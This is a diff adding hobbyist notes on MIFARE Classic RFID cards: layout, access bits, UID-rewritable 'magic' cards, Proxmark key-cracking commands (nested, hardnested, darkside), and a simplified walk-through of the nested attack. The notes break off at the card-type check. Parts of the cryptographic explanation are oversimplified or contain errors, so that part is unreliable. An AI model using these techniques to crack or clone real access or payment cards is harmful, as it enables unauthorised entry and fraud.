@@ -1,0 +1,1014 @@
+[SOF] | File: MFC_INFO.txt | Width: 120 | Tab: 4 |
+
+ ,----------------------------.
+(  MiFare Classic Information  )
+ `----------------------------'
+
+	Table-of-Contents
+	-----------------
+	
+	1.1		RELATED CARDS
+	1.2		MAGIC CARDS
+	
+	2.1		CARD LAYOUT
+	2.2		ACCESS BITS
+	
+	3.1		MFC ATTACKS
+	3.2		LFSR
+	3.3		NESTED ATTACK
+	
+	4.1		CHECK CARD TYPE
+	4.2		BASIC CRYPTO CHECK
+	4.3		CHECK FOR KNOWN KEYS
+	4.4		CRACK THE KEYS
+	4.5		DUMP THE DATA
+	
+	5.1		MEANWHILE, OVER ON THE FLIPPER
+	5.2		IMPROVE THE ATTACK
+
+ ,---------------------.
+(  1.1 : RELATED CARDS  )
+ `---------------------'
+
+CLASSIC 1K
+==========
+	This is where it all began
+	...not NFC, just the MiFare range of NFC chips by NXP Semiconductors
+
+
+EV1 1K
+=======
+	The "EV1 1K" is an updated "Classic"
+	It (primarily) addresses NOnce timing attacks
+	Otherwise, they work in a nigh-identical way
+
+PLUS
+====
+	The "Plus" is "Classic" with support for AES encryption
+	but it is ALSO has a "transition" mode which allows it to be
+	backward compatible with "Classic" readers.
+	Leaving applications open to Transition Attacks
+
+Datasheets here:
+	https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf
+	https://github.com/DrWhax/ovstation/tree/master/ovknip
+
+ ,-------------------.
+(  1.2 : MAGIC CARDS  )
+ `-------------------'
+
+https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/magic_cards_notes.md
+
+There is (normally) one block on the card which is write-disabled. This holds 
+the card's Unique ID, and some other manufacturing information.
+
+So called "Magic" cards *CAN* write to Sector:Block 0:0 (UID & Mfg Info)
+
+- Gen 1a -
+	Write to Block 0 using the (new) Command {0x43,0x40}
+	Readers started checking for the presence of this Command
+	Requires Proxmark (or similar)
+
+- Gen 1b -
+	Write to Block 0 using the (new) Command {0x43,0x40}
+	Added a (new) command to set a CUSTOM Unlock Code
+	Requires Proxmark (or similar)
+
+- Gen 2 -
+	Removed the "Special Commands"
+	You now write to the card with the normal write(sector, block, data) command
+	Can be written to with Android OS calls (as well as Proxmark, etc.)
+
+- Gen 2 OTW -
+	Same as Gen 2, but Block 0 is "One Time Write"
+	Once written it can never be changed
+	There is no documented way for a reader to detect these (fake) cards
+
+ ,-------------------.
+(  2.1 : CARD LAYOUT  )
+ `-------------------'
+
+There are         16 Sectors
+Each Sector has    4 Blocks
+Each Block has    16 Bytes
+
+A total of        64 Blocks
+And             1024 Bytes  (64 * 16)  "Classic 1K"**
+
+**of which (less than) 75% is available for User Data.
+
+A Sector looks like this:
+
+[=] -----+-----+-------------------------------------------------+-----------------
+[=]  sec | blk | data                                            | ascii
+[=] -----+-----+------------¦--|--|-----|-----------|------------+-----------------
+[=]    0 |   0 | B9 56 20 34¦FB|08|04 00|01 F2 C7 DA|56 F3 27 1D | .V 4........V.'.
+[=]      |   1 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |   2 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |   3 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+
+A Sector has 4 Blocks
+	{0, 1, 2} contain (with 1 exception) : "User Data"
+	{3}       contains TWO Keys and their access permissions : "Sector Trailer"
+
+It is generally notated as either:
+	Block B    : where 0 <= B <= 63
+	Block(S,b) :       0 <= S <= 15 ; 0 <= b <= 3
+	Ie.        : B = ((4 * S) + b)
+
+Block 0 [aka Block(0,0)] is used to store:
+	A Unique ID (UID).  Which, on the Classic, is 4 bytes + 1 byte check-digit
+	And some Manufacturing Information, which uses the remaining (16-5)=11 bytes
+
+	From the example [above], Block(0,0) contains:
+
+		------------------------------------------------
+		 0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 
+		------------------------------------------------
+		B9 56 20 34 FB 08 04 00 01 F2 C7 DA 56 F3 27 1D
+		|^^^^^^^^^^ |^ |^ |^^^^ |^^^^^^^^^^^^^^^^^^^^^^
+		|           |  |  |     |
+		|           |  |  |     `--- Manufacturer Data
+		|           |  |  `--- ATQA
+		|           |  `--- SAK (vanity)
+		`--- UID    `--- BCC (UID CRC)
+
+	UID   [0...3] - The UID is (theoretically) unique
+	BCC   [  4  ] - Checksum for UID *1*
+	SAK   [  5  ] - Select Acknowledge ("vanity" copy) *2* *3*
+	ATQA  [6...7] - Answer To reQuest A
+	MfgDat[8..15] - ???
+
+	*1*	[usb] pm3 --> analyse lcr -d B9562034
+		[+] Target [34] requires final LRC XOR byte value: 0xFB
+
+	*2*	https://gist.github.com/equipter/3022aea4e371e585ff6e46de637e7769
+
+	*3*	qv. "AN10833 - MIFARE type identification procedure" esp. [Figure 1]
+
+	This Block is ALWAYS non-writable (ie. read-only)
+	...regardless of the access bits [keep reading]
+	...Unless, of course, you have a "Magic" card!
+
+Block(S,3), the "Sector Trailer" contains :
+	2  6-byte Crypto Keys {A, B}
+	6  4-bit  Permission Bits
+	1  8-bit  User Data
+
+	From the following example [below], Blocks 19 (4,3) and 23 (5,3) contain:
+	
+		      .-------------------------------------------------------.
+		Block |       Key A       |  Access  |User|       Key B       |
+		------+-------------------+----------+----+-------------------|
+		 19   | FF FF FF FF FF FF | FF 07 80 | 69 | FF FF FF FF FF FF |
+		 23   | 44 B9 56 20 34 45 | 78 77 88 | 00 | 44 B9 56 20 34 45 |
+
+The Access Bits give access permissions to each of the keys.
+
+Eg. The key used by the top-up kiosk (Key B) can ADD credit,
+    but the key used by the vending machine (Key A) can only REMOVE credit
+
+Eg. The check-in desk can write an entry code to your doorkey (Key B)
+	But the room can only READ the entry code (Key A)
+
+There are SIX possible operations:
+		Read  - can read data from Block
+		Write - can write data to Block
+		Increment - The block is used as a counter**, Increment it
+		Decrement - The block is used as a counter**, Decrement it
+		Transfer - Copy  the block TO the internal transfer buffer
+		Restore  - Paste the internal transfer buffer TO the block
+
+Not every conceivable option-combination either
+	a) makes sense, or
+	b) is an available choice
+qv. MF1S50YYX_V1.pdf - "MIFARE Classic EV1 1K - Mainstream contactless smart
+    card IC for fast and easy solution development" - Section 8.7 - 
+    "Memory access" ...specifically 8.7.3, and 8.7.2 (in that order)
+
+Generally speaking, Key B is more powerful than Key A
+
+**Counters are stored in a corruption-resilient manner
+qv. MF1S50YYX_V1.pdf - "MIFARE Classic EV1 1K - Mainstream contactless smart 
+    card IC for fast and easy solution development" - Section 8.6.2.1 - 
+    "Value Blocks"
+
+Eg. You can configure a card such that Key B can *SET* a counter [issue credit]
+    But Key A can only decrement that counter [use credit]
+
+--------------------------------------------------------------------------------
+
+Here's one I cracked earlier:
+	[usb|script] pm3 --> hf mf dump
+
+[=] -----+-----+-------------------------------------------------+-----------------
+[=]  sec | blk | data                                            | ascii
+[=] -----+-----+------------¦--|--|-----|----------- ------------+-----------------
+[=]    0 |   0 | B9 56 20 34¦FB|08|04 00|01 F2 C7 DA 56 F3 27 1D | .V 4........V.'.
+[=]      |   1 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |   2 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |   3 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]    1 |   4 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |   5 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |   6 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |   7 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]    2 |   8 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |   9 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  10 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  11 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]    3 |  12 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  13 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  14 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  15 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]    4 |  16 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  17 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  18 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  19 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]    5 |  20 | 8E 6F 62 6A C0 72:FD 78 2C:17:2E 37 4D ED 5B C3 | .obj.r.x,..7M.[.
+[=]      |  21 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  22 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  23 | 44 B9 56 20 34 45|78 77 88|00|44 B9 56 20 34 45 | D.V 4Exw..D.V 4E
+								  |        |  |
+[=]    6 |  24 | 01 DE 4D C3 C5 91:27 7A B9:8C:E8 60 26 F9 4C 35 | ..M...'z...`&.L5
+[=]      |  25 | C5 27 45 20 C7 2A:25 E8 B7:42:A5 90 87 3A C5 18 | .'E .*%..B...:..
+[=]      |  26 | 17 D2 05 80 C7 4A:25 C8 37:22:E5 B0 47 9A 72 AF | .....J%.7"..G.r.
+[=]      |  27 | 44 B9 56 20 34 45|78 77 88|00|85 FC D9 82 EA 5A | D.V 4Exw.......Z
+								  |        |  |
+[=]    7 |  28 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  29 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  30 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  31 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]    8 |  32 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  33 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  34 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  35 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]    9 |  36 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  37 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  38 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  39 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]   10 |  40 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  41 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  42 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  43 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]   11 |  44 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  45 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  46 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  47 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]   12 |  48 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  49 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  50 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  51 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]   13 |  52 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  53 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  54 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  55 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]   14 |  56 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  57 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  58 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  59 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+								  |        |  |
+[=]   15 |  60 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  61 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  62 | 00 00 00 00 00 00:00 00 00:00:00 00 00 00 00 00 | ................
+[=]      |  63 | FF FF FF FF FF FF|FF 07 80|69|FF FF FF FF FF FF | .........i......
+[=] -----+-----+-------------------------------------------------+-----------------
+
+`autopwn` has cracked FOUR keys.
+
+ ,-------------------.
+(  2.2 : ACCESS BITS  )
+ `-------------------'
+
+	The Access bits on both (used) Sectors is the same:  78 77 88
+
+	Let's reorganise that according to the official spec Fig 9.
+		 Access        C1 C2 C3
+	   ==========     ===========
+		78 77 88  -->  78 87 87
+		ab cd ef  -->  cb fa ed
+		
+	The second nybble of each byte is the inverse of the first nybble.
+	It is there to trap tranmission errors, so we can just ignore it/them.
+	
+	So our Access Control value is : {c, f, e} == {7, 8, 8}
+	
+	Let's convert those nybbles to binary
+		(c) 7 --> 0111
+		(f) 8 --> 1000
+		(e) 8 --> 1000
+		          |||| ...and transpose them:
+		          ||||
+		          |||`--- 100 - Block 0 Access bits
+		          ||`---- 100 - Block 1 Access bits
+		          |`----- 100 - Block 2 Access bits
+		          `------ 011 - Block 3 Access bits [Sector Trailer]
+
+	Now we can use the lookup table [Table 3] to work out what we can do
+	with the Sector Trailer (Block(S,3)):
+	
+		      |    Key A     | | Access Bits  | |    Key B     |
+			  | read ¦ write | | read ¦ write | | read ¦ write |
+			  +------¦-------+ +------¦-------+ +------¦-------+
+		000 : |  --  ¦ KeyA  | | KeyA ¦  --   | | KeyA ¦ KeyA  |
+		001 : |  --  ¦ KeyA  | | KeyA ¦ KeyA  | | KeyA ¦ KeyA  | Transport Mode
+		010 : |  --  ¦  --   | | KeyA ¦  --   | | KeyA ¦  --   |
+
+		011 : |  --  ¦ KeyB  | | A+B  ¦ KeyB  | |  --  ¦ KeyB  | <-- Our Card!
+
+		100 : |  --  ¦ KeyB  | | A+B  ¦ --    | |  --  ¦ KeyB  |
+		101 : |  --  ¦  --   | | A+B  ¦ KeyB  | |  --  ¦  --   |
+		110 : |  --  ¦  --   | | A+B  ¦  --   | |  --  ¦  --   | }__ 
+		111 : |  --  ¦  --   | | A+B  ¦  --   | |  --  ¦  --   | }   The Same!?
+		
+	Our card uses 011, for (both of) the (used) Sector Trailer(s). So: 
+		Both Key A and Key B can READ the Access Bits
+		Key B can (additionally) WRITE to Key A, Key B (itself), and the Access Bits
+
+	Then we can do a similar lookup for the 3 data Blocks (in this Sector)
+	This time using [Table 4]
+	
+		      |    Data      |   Counter   |
+			  | read ¦ write | Inc  ¦ Dec  |
+			  +------¦-------+------¦------+
+		000 : | A+B  ¦  A+B  | A+B  ¦  A+B | Transport Mode
+		001 : | A+B  ¦  --   |  --  ¦  A+B |
+		010 : | A+B  ¦  --   |  --  ¦  --  |
+		011 : | KeyB ¦  KeyB |  --  ¦  --  |
+		
+		100 : | A+B  ¦  KeyB |  --  ¦  --  | <-- Our Card!
+		
+		101 : | KeyB ¦  --   |  --  ¦  --  |
+		110 : | A+B  ¦  KeyB | KeyB ¦  A+B |
+		111 : | --   ¦  --   |  --  ¦  --  |
+
+	Our card uses 100, for all of the (used) Sectors. So: 
+		Both Key A and Key B can READ the Block
+		Only Key B can WRITE to the Block
+										  
+	WARNING: 
+		IF YOU PLAN TO CHANGE ACCESS BITS, RTFM, THERE IS MUCH TO CONSIDER !
+
+ ,-------------------.
+(  3.1 : MFC ATTACKS  )
+ `-------------------'
+
+	https://www.sidechannel.blog/en/mifare-classic-2/
+
+	[usb|script] pm3 --> hf mf  fchk  [dictionary]
+
+		Fast Check - See if every Sector is using a single known key
+		...depressingly effective!
+
+		...Can optionally add your own dictionary.
+		[dictionary], eg. client/dictionaries/mfc_default_keys.dic
+
+
+	[usb|script] pm3 --> hf mf  chk  [dictionary]
+
+		Standard Check - Check each Sector for its own key
+
+		...Can optionally add your own dictionary.
+		[dictionary], eg. client/dictionaries/mfc_default_keys.dic
+
+
+	[usb|script] pm3 --> hf mf  nested
+
+		https://www.sidechannel.blog/en/mifare-classic-2/#:~:text=Proxmark%203%3A%20Nested%20attack
+		[See below]
+
+
+	[usb|script] pm3 --> hf mf  hardnested
+
+		The timing attack was addressed by NXP
+		Then someone worked out how to get around the fix
+
+		https://www.cs.ru.nl/~rverdult/Ciphertext-only_Cryptanalysis_on_Hardened_Mifare_Classic_Cards-CCS_2015.pdf
+
+
+	[usb|script] pm3 --> hf mf  staticnested
+
+		Some cards generate the same NOnce every time
+		This attack abuses that knowledge
+
+
+	[usb|script] pm3 --> hf mf  nack
+
+		Check for the presence of the NACK bug which can be leveraged to
+			a) reveal the key one byte at a time
+			b) leak 4bits of the Key Data each time
+
+
+	[usb|script] pm3 --> hf mf  darkside
+
+		Utilise the NACK "bug" in an attack
+
+		https://discovery.ucl.ac.uk/id/eprint/20439/2/courtois_secrypt09.pdf
+
+
+	[usb|script] pm3 --> hf mf  smartbrute
+
+		This uses various strategies to try and guess the key, such as:
+			Spotting repeated bytes
+			Use of the UUID or fragments thereof
+			Other remnants of (harvested) key stretching alogrithms.
+
+		The documentation for this is: The Source Code
+
+ ,------------.
+(  3.2 : LFSR  )
+ `------------'
+
+What is it?
+-----------
+	An LFSR is an algorithm (which is easily implemented with transistors) that
+	generates a pseudo-random (unpredictable, but repeatable) list of numbers.
+
+	This number sequence will include up to (but not including) its maximum count
+	Eg. An 4-bit LFSR CAN generate (2^4)-1 = 15 possible values
+	...Try putting 0 in to an LFSR and see what happens ;)
+
+	Each value is a function of the previous value, so when you see a value you
+	have seen before, you know you've just found the loop point.
+	This function is non-reversible. Ie. You can move forward through the
+	values, but you cannot go backwards.
+
+	LFSR's have many uses. The "Classic" range of cards use one as a PRNG.
+	...As do the NES and the N64 ;)
+	All cards (of the same type) use the same ("Tags" for their) LFSR.
+	..Ie. "The same LFSR"
+
+How does it work?
+-----------------
+
+	Let's stick with a tiny 4-bit Register (cos ASCII art)
+	The PRNG in the Classic is 32-bits
+
+	         .---.   .---.   .---.   .---.
+	         |2^3|---|2^2|---|2^1|---|2^0|
+	         `---'   `---'   `---'   `---'
+
+	We also need to pick our "Tap" points (comparable to a CRC polynomial)
+
+	We MUST have 2 or more. The maximum is (obviously) the size of the register
+	We have a 4-bit register, so our range is {2..4}
+	Eg.  3 "Tap points" : 1011
+
+	           1       0       1       1
+	         .---.   .---.   .---.   .---.
+	,--------|2^3|---|2^2|---|2^3|---|2^0|
+	|        `---'   `---'   `---'   `---'
+	|    __    !               !       !
+	|   /  |---'               !       !
+	`--<XOR|-------------------'       !
+	    \__|---------------------------'
+		STATE
+
+	Each Tap feeds in to an XOR gate.
+	The output of the XOR gate is known as the "State"
+
+	I have drawn (badly) a "3-input XOR gate"
+	At a silicon level, it would more likely be implemented as
+	multiple "2-input XOR gates" feeding in to each other
+
+	We also need to pick a start value, (comparable to a CRC initialiser)
+	Eg. 1100
+
+	         .---.   .---.   .---.   .---.
+	,--------| 1 |---| 1 |---| 0 |---| 0 |
+	|        `---'   `---'   `---'   `---'
+	|    __    !               !       !
+	|   /  |---'               !       !
+	`--< 1 |-------------------'       !
+	    \__|---------------------------'
+		STATE
+
+	Now we can run it.
+		10 Wait for clock edge (your choice of edge)
+		20 Shift everything to the right
+		30 Calculate the new State value
+		40 goto 10
+
+== Initialise ==                                 I                            I
+		         .---.   .---.   .---.   .---.   I                            I
+		,--------| 1 |---| 1 |---| 0 |---| 0 |   I   ?:???? --> 1:1100        I
+		|        `---'   `---'   `---'   `---'   I                |           I
+		|    __    !               !       !     I                |           I
+		|   /  |---'               !       !     I                |           I
+		`--< 1 |-------------------'       !     I                |           I
+		    \__|---------------------------'     I                |           I
+		    STATE                                I                |           I
+	                                             I     ,----------'           I
+== Clock 1 ==                                    I     |                      I
+	                                             I     |                      I
+	Shift Right:  1-1100 --> ?-1110              I     +<-----------------.   I
+		                                         I     |                  |   I
+		         .---.   .---.   .---.   .---.   I     V                  |   I
+		,--------| 1 |---| 1 |---| 1 |---| 0 |   I   1:1100 --> ?:1110    |   I
+		|        `---'   `---'   `---'   `---'   I                |       |   I
+		|    __    !               !       !     I                |       |   I
+		|   /  |---'               !       !     I                |       |   I
+		`--< ? |-------------------'       !     I                |       |   I
+		    \__|---------------------------'     I     .----------'       |   I
+		                                         I     |                  |   I
+	Update State: ?-1110 --> 0-1110              I     |                  |   I
+		                                         I     |                  |   I
+		         .---.   .---.   .---.   .---.   I     V                  |   I
+		,--------| 1 |---| 1 |---| 1 |---| 0 |   I   ?:1110 --> 0:1110    |   I
+		|        `---'   `---'   `---'   `---'   I                |       |   I
+		|    __    !               !       !     I                |       |   I
+		|   /  |---'               !       !     I                |       |   I
+		`--< 0 |-------------------'       !     I                |       |   I
+		    \__|---------------------------'     I     ,----------'       |   I
+		                                         I     |                  |   I
+== Clock 2 ==                                    I     |                  |   I
+		         .---.   .---.   .---.   .---.   I     V                  |   I
+		,--------| 0 |---| 1 |---| 1 |---| 1 |   I   0:0111 --> 0:0111    |   I
+		|        `---'   `---'   `---'   `---'   I                 |      |   I
+		|    __    !               !       !     I                 |      |   I
+		|   /  |---'               !       !     I     .-----------'      |   I
+		`--< 0 |-------------------'       !     I     |                  |   I
+		    \__|---------------------------'     I     |                  |   I
+		                                         I     V                  |   I
+=Clock 3=   |0>---[0]-----[0]-----[1]-----[1]    I   0:0111 --> 0:0011    |   I
+	         `-----+---------------+-------+     I     ,----------'       |   I
+		                                         I     V                  |   I
+=Clock 4=   |1>---[0]-----[0]-----[0]-----[1]    I   0:0011 --> 1:0001    |   I
+	        `-----+---------------+-------+      I     ,----------'       |   I
+		                                         I     V                  |   I
+=Clock 5=   |1>---[1]-----[0]-----[0]-----[0]    I   1:0001 --> 1:1000    |   I
+	         `-----+---------------+-------+     I     ,----------'       |   I
+		                                         I     V                  |   I
+=Clock 6=   |1>---[1]-----[1]-----[0]-----[0]    I   1:1000 --> 1:1100 ---'   I
+	         `-----+---------------+-------+     I                            I
+												 I                            I
+	Out of the (2^4)-1=15 possible values
+	our choice of Tags and Initiialiser generate 6 of them before it loops
+		Size: 4 bits
+		Init: 1100
+		Tags: 1011
+		Output:
+			0 : |1> 1100 
+			1 : |0> 1110 <--.
+			2 : |0> 0111    |
+			3 : |0> 0011    |     
+			4 : |1> 0001    | Loop
+			5 : |1> 1000    |
+			6 : |1> 1100 ---'
+
+So What?
+--------
+	The early cards had an LFSR which started at the same value every time
+	and (also) started "running" the LFSR as soon as they entered the reader's
+	NFC field.
+
+	IF you could control the reader's on/off feature, THEN you could predict the
+	NOnce AND break the crypto.
+
+	NXP named this LFSR "Crypto-1"
+	The hack is now so well recognised, it has a wikipedia page!
+		https://en.wikipedia.org/wiki/Crypto-1
+
+	Some "cheap" (fake) cards, don't have ANY kind of PRNG, and just produce
+	the same 32-bit number every time! ...What I call an "NTwice" or "NMany".
+
+ ,---------------------.
+(  3.3 : NESTED ATTACK  )
+ `---------------------'
+
+After a lot of reading, this is my best understanding of the Nested Attack:-
+
+	XOR Encryption
+	--------------
+		Symbol used here is: ^ (circumflex) ...the programmers choice
+		Mathematicians lump it in to Set Theory and use (+) (+ in a circle)
+
+		XOR | 0  1    1010
+		----|------   1100^
+		 0  | 0  1    ====
+		 1  | 1  0    0110
+
+		XOR is "commutable". That is:
+			(X ^ Y)  is exactly equal to  (Y ^ X)
+
+		To encrypt data, you simply XOR the "Plaintext Data" with the
+		"Encryption Key":-
+			Plaintext Data : 1010'1100   \___ Everywhere you see a 1 in the Key,
+			Encryption Key : 1100'1010^  /    flip the bit in the plaintext
+							===========
+			Encrypted Data : 0110'0110   <--------- Result
+
+		This process works in BOTH directions!
+		Ie. If you have the "Encrypted Data" and the "Encryption Key" you can
+		get the Plaintext Data - USING THE SAME METHOD**.
+
+			Encrypted Data : 0110'0110
+			Encryption Key : 1100'1010^
+			                ===========
+			Plaintext Data : 1010'1100
+
+		**This is known as SYMMETRIC Encryption.
+		  Ie. Both the Server and the Client use the SAME key.
+
+		In fact, you can even XOR "Encrypted Data" with the "Plaintext Data" and
+		get the "Encryption Key"! :-
+
+			Plaintext Data : 1010'1100
+			Encrypted Data : 0110'0110^
+			                ===========
+			Encryption Key : 1100'1010
+
+		If you have any TWO pieces of information, you can infer the THIRD :)
+
+	Nomenclature/Key
+	----------------
+		S     : A Sector
+		Sknown: A Sector with a     KNOWN Key (either A or B)
+		Sunk  : A Sector with an UN-KNOWN Key (either A or B)
+
+		K     : A 48-bit Key
+		Kknown: A Key which is    KNOWN
+		Kunk  : A Key which is UN-KNOWN
+
+		N     : A 32-bit NOnce (ie. A "random" number)
+		N1enc : The encrypted NOnce received in reply to the FIRST  read request
+		N2enc : The encrypted NOnce received in reply to the SECOND read request
+
+		read(s)
+			We also allow ourselves a function  `read(s)`  which reads the
+			Sector Trailer (the last of the four Blocks) in a Sector [S]
+
+	Concept
+	-------
+		# We control the reader [proxmark]
+		# The reader controls the NFC field
+		# The NFC field powers the card
+		# Power-up starts the card's LFSR Clock ticking
+		# The LFSR is (here) used as a Pseudo-Random Number Generator [PRNG]
+		# The value in the LFSR - at any given time since power-up - is always
+		  the same value... Timing is critical!
+		# The Psuedo-Random Number [PRN] from the LFSR is used as the NOnce
+
+	Stage 1
+	-------
+		Pick a Sector [Sknown] with a KNOWN 48-bit Key (either A or B) [Kknown]
+
+		Calling read(S), replies with a 32-bit NOnce [N1] which is encrypted
+		(using XOR) with one of the Sector's Keys (A/B) (which we know [Kknown])
+		...to make the encrypted-NOnce [N1enc].
+			N1enc  <---(N1 ^ Kknown)
+
+		Power up the reader (to start the LFSR running on the card)
+
+		100mS (after power up)  [100 is an arbitrary choice in Stage 1]
+			Send :  read(Sknown)  ..read a sector with a KNOWN Key [Kknown]
+			Reply:  N1enc         ..receive a NOnce encrypted with [Kknown]
+
+		We can decrypt the encrypted NOnce [Nenc]
+		by XOR'ing it with the (known) Key [Kknown]
+			N1 <---(N1enc ^ Kknown)
+
+		We now have Three values
+			# Kknown : Our known Key [Kknown]
+			# N1enc  : First encrypted NOnce - encrypted with Kknown
+			# N1     : First plaintext NOnce
+
+		...Nothing especially clever or interesting ...yet
+
+	Stage 2
+	-------
+		Pick a second Sector [Sunk], with a Key which is UNKNOWN [Kunk]
+
+		Turn the reader off-and-back-on-again (to RE-start the LFSR on the card)
+
+		100mS (after power up)  [100 is the time we used previously]
+			Send :  read(Sknown)  ..read a sector with an UN-KNOWN Key [Kunk]
+			Reply:  N2enc         ..receive a NOnce encrypted with [Kunk]
+			
+		This time we cannot decrypt the NOnce, because the Key is UNKNOWN
+
+		But we CAN add one more thing to our collection:
+			# Kknown : Our known Key [Kknown]
+			# N1enc  : First  encrypted NOnce - encrypted with Kknown
+			# N1     : First  plaintext NOnce
+			# N2enc  : Second encrypted NOnce - encrypted with Kunk
+
+		This is where we can think laterally...
+		
+		Because the LFSR is predictable-over-time
+		We know that the NOnce will be THE SAME VALUE both times...
+			N1enc <---(N1 ^ Kknown)
+			N2enc <---(N2 ^ Kunk)
+		N1 == N2, so:
+			N1enc <---(N ^ Kknown)
+			N2enc <---(N ^ Kunk)
+
+		We just don't know the value of [Kunk]
+			N2enc <---(N ^ ?????)
+
+		What was that rule about XOR?
+		If we have any two values, we can infer the third one...
+
+		So if I take some "Encrypted Data" [N2enc] and XOR it with the
+		"Plaintext Data" [N], I get the "Encryption Key", (aka. the NOnce,
+		aka. the contents of the LFSR, aka the Psuedo-Random Number,
+		aka. the Symmetric Key :)
+
+		I present to you. The "Unknown" Key:
+			Kunk <---(N ^ N2enc)
+
+		This is called a "Known-Plaintext Attack"
+		And we 'Know' the 'Plaintext' because we used a "Timing Attack"
+		...to control a "Predictable PRNG"
+
+		Sadly, it's not perfect :/
+		The key is 48bits long ...and the NOnce is only 32bits long
+		So we only actually "recover" 32-bits of the 48-bit Unknown Key [Kunk]
+
+		However, that reduces our search space
+			from : 281,474,976,710,656  (2^48)   ; 48 = keySize
+			to   :              65,536  (2^16)   ; 16 = keySize - NOnceSize
+
+		As a sense of proportion, that is:
+			The entirety of all global debt ever accumulated by humanity [2023]
+			  -vs-
+			1 person on minimum wage for 3 yrs.
+			
+ ,-----------------------.
+(  4.1 : CHECK CARD TYPE  )
+ `-----------------------'
+
+	[usb] pm3 --> hf search
+	🕕  Searching for ISO14443-A tag...
+	[+]  UID: B9 56 20 34
+	[+] ATQA: 00 04
+	[+]  SAK: 08 [2]
+	[+] Possible types:
+	[+]    MIFARE Classic 1K
